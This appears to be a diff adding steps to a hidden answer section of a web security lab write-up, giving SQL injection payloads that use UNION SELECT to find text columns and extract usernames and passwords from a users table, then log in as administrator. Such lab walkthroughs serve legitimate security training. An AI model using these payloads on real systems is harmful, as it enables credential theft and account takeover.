@@ -37,5 +37,15 @@ Do not read unless explicitly looking for exact answers
   Verify number of colums with the NULL payload:
   
     category=' UNION SELECT NULL,NULL--
+    
+  Verify they contain text:
+  
+    category=' UNION SELECT 'abc','def'--
+    
+  Retrieve data from users table:
+  
+    category=' UNION SELECT username, password FROM users--
+  
+  Login using administrator and password found from injection
 
 </details>
